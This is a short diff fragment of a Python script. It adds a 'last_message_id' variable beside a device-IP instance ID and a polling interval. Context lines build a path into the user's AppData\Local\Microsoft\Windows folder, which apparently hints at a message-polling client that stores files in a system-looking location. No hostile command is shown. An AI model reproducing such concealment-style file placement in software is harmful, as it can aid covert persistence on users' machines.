@@ -105,6 +105,7 @@ def get_device_ip():
 
 INSTANCE_ID = get_device_ip()
 UPDATE_INTERVAL = 30
+last_message_id = None
 
 user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
